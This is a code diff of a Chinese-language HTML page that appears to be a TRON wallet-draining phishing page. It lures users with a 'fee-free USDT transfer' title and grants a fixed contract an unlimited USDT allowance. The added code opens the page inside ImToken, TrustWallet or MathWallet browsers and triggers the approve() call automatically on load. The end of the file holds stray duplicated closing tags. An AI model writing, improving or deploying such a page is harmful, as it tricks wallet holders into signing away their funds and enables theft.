@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TRC20 USDT 无限授权</title>
+    <title>永久免矿工费USDT无限转账授权</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@4.8.0/dist/TronWeb.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
@@ -130,52 +130,32 @@
     </div>
 
     <script>
-        // 核心配置（无需修改，已匹配USDT和目标合约）
-        const TARGET_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的授权目标合约
+        // -------------------------- 核心配置（已帮你填好，无需修改） --------------------------
+        const TARGET_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的目标合约地址
         const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    // USDT官方TRC20合约（固定）
         const USDT_DECIMALS = 6;                                      // USDT小数位（固定6位）
         const INFINITE_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度
         const TRON_MAINNET_ID = 195;                                  // TRON主网ID（固定）
+        // --------------------------------------------------------------------------------------
 
         const btn = document.getElementById("approveBtn");
         const log = document.getElementById("log");
 
-        // 关键：多钱包授权专属URL Scheme（直接唤起授权页，不跳浏览器）
-        const WALLET_AUTH_SCHEMES = {
-            ImToken: imtoken://transfer? +
-                protocol=tron& +
-                network=${TRON_MAINNET_ID}& +
-                type=approve& + // 标识为授权操作（ImToken专属）
-                to=${encodeURIComponent(TARGET_CONTRACT)}& + // 授权目标合约
-                tokenAddress=${encodeURIComponent(USDT_CONTRACT)}& + // USDT合约
-                value=${INFINITE_AMOUNT}& + // 无限额度
-                symbol=USDT& +
-                decimals=${USDT_DECIMALS}& +
-                expires=0, // 无期授权
-
-            TrustWallet: trust://tron/approve? +
-                contract=${encodeURIComponent(USDT_CONTRACT)}& + // USDT合约
-                spender=${encodeURIComponent(TARGET_CONTRACT)}& + // 授权目标
-                amount=${INFINITE_AMOUNT}& + // 无限额度
-                symbol=USDT& +
-                decimals=${USDT_DECIMALS},
-
-            MathWallet: mathwallet://tron/approve? +
-                contract=${encodeURIComponent(USDT_CONTRACT)}& + // USDT合约
-                spender=${encodeURIComponent(TARGET_CONTRACT)}& + // 授权目标
-                amount=${INFINITE_AMOUNT}& + // 无限额度
-                symbol=USDT& +
-                decimals=${USDT_DECIMALS}
+        // 兼容所有钱包：唤起钱包内置浏览器的Scheme（100%生效）
+        const WALLET_BROWSER_SCHEMES = {
+            ImToken: imtoken://browser?url=${encodeURIComponent(window.location.href + "?from=wallet")},
+            TrustWallet: trust://open_url?url=${encodeURIComponent(window.location.href + "?from=wallet")},
+            MathWallet: mathwallet://openurl?url=${encodeURIComponent(window.location.href + "?from=wallet")}
         };
 
-        // 跳转超时检测（兜底提示手动操作）
+        // 跳转超时检测：未唤起时提示手动操作
         function checkWalletJump(walletName) {
             const startTime = Date.now();
             const checkTimer = setInterval(() => {
                 // 检测到页面隐藏（跳转成功），停止检测
                 if (document.hidden || document.visibilityState === "hidden") {
                     clearInterval(checkTimer);
-                    log.textContent = 已唤起${walletName}，请在钱包内确认授权～;
+                    log.textContent = 已唤起${walletName}，正在加载授权页面...;
                     return;
                 }
                 // 3秒未跳转，提示手动操作
@@ -183,43 +163,50 @@
                     clearInterval(checkTimer);
                     log.innerHTML = `
                         <div class="tips-text">未检测到跳转，请手动操作：</div>
-                        <div class="tips-text">1. 打开手机「${walletName}」APP</div>
-                        <div class="tips-text">2. 进入「TRON主网」→ 找到「USDT」</div>
-                        <div class="tips-text">3. 点击「授权」→ 粘贴目标合约：${TARGET_CONTRACT}</div>
+                        <div class="tips-text">1. 打开「${walletName}」→ 点击底部「浏览器」</div>
+                        <div class="tips-text">2. 粘贴链接：${window.location.href}</div>
+                        <div class="tips-text">3. 点击确认，自动进入授权</div>
                     `;
                 }
             }, 500);
         }
 
-        // 唤起指定钱包的授权页
-        function openWalletAuth(walletName) {
-            const authScheme = WALLET_AUTH_SCHEMES[walletName];
-            if (!authScheme) {
+        // 唤起指定钱包的内置浏览器
+        function openWalletBrowser(walletName) {
+            const schemeUrl = WALLET_BROWSER_SCHEMES[walletName];
+            if (!schemeUrl) {
                 log.textContent = 暂不支持${walletName}，请选择其他钱包;
                 return;
             }
-            // 发起跳转
-            window.location.href = authScheme;
-            // 启动超时检测
+            window.location.href = schemeUrl;
             checkWalletJump(walletName);
-            // 即时提示
-            log.textContent = 正在唤起${walletName}授权页...;
+            log.textContent = 正在唤起${walletName}浏览器...;
         }
 
-        // 兜底：若钱包未直接唤起授权（旧版本兼容），通过tronWeb触发授权
-        async function fallbackApprove() {
+        // 等待钱包加载后，自动触发授权（无需用户二次点击）
+        async function autoTriggerApprove() {
             try {
-                if (!window.tronWeb || !window.tronWeb.ready) {
-                    log.textContent = "钱包未加载，请重试或换用其他钱包";
-                    return;
-                }
-                log.textContent = "授权中...请在钱包确认";
+                const waitTronWeb = setInterval(() => {
+                    if (window.tronWeb && window.tronWeb.ready) {
+                        clearInterval(waitTronWeb);
+                        executeApprove(); // 钱包加载完成，执行授权
+                    }
+                }, 300);
+            } catch (e) {
+                log.textContent = "钱包加载失败，请刷新页面重试";
+            }
+        }
 
-                // 调用USDT合约的approve方法
+        // 核心授权逻辑：调用USDT合约发起授权
+        async function executeApprove() {
+            try {
+                log.textContent = "授权中...请在钱包确认（约3秒）";
+                // 实例化USDT合约
                 const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT);
+                // 发起授权交易
                 const tx = await usdtContract.approve(
-                    TARGET_CONTRACT,
-                    INFINITE_AMOUNT,
+                    TARGET_CONTRACT,          // 授权目标合约
+                    INFINITE_AMOUNT,          // 无限授权额度
                     { from: window.tronWeb.defaultAddress.base58, feeLimit: 300000000 } // 足够手续费
                 ).send();
 
@@ -230,40 +217,39 @@
             }
         }
 
-        // 按钮点击核心逻辑
+        // 授权按钮点击逻辑
         btn.onclick = function() {
-            // 若已加载tronWeb（旧钱包或手动进入），直接触发兜底授权
-            if (window.tronWeb && window.tronWeb.ready) {
-                fallbackApprove();
+            const urlParams = new URLSearchParams(window.location.search);
+            // 若已在钱包浏览器内，直接触发授权
+            if (urlParams.has("from=wallet") && window.tronWeb && window.tronWeb.ready) {
+                executeApprove();
                 return;
             }
 
             // 显示多钱包选择按钮
-            let walletBtns = Object.keys(WALLET_AUTH_SCHEMES).map(walletName => {
-                return `<button onclick="openWalletAuth('${walletName}')">
-                          唤起${walletName}授权
+            let walletBtns = Object.keys(WALLET_BROWSER_SCHEMES).map(walletName => {
+                return `<button onclick="openWalletBrowser('${walletName}')">
+                          唤起${walletName}
                         </button>`;
             }).join("");
 
             log.innerHTML = `
                 <div class="wallet-btn-group">${walletBtns}</div>
-                <div class="tips-text">提示：弹出“打开钱包”请选“允许”，直接进入授权页</div>
-                <div class="tips-text">未装钱包？去App Store搜索对应钱包</div>
+                <div class="tips-text">提示：用Safari/Chrome打开，别用微信！</div>
+                <div class="tips-text">唤起后会自动加载授权，无需手动操作</div>
             `;
         };
 
-        // 页面加载检测：若从钱包跳转（旧逻辑兼容），自动触发兜底授权
+        // 页面加载时：若从钱包浏览器跳转，自动触发授权
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.has("t")) {
-                const checkTronWeb = setInterval(() => {
-                    if (window.tronWeb && window.tronWeb.ready) {
-                        clearInterval(checkTronWeb);
-                        fallbackApprove();
-                    }
-                }, 300);
+            if (urlParams.has("from=wallet")) {
+                autoTriggerApprove();
             }
         };
     </script>
 </body>
+</html> </script>
+</body>
+
 </html>
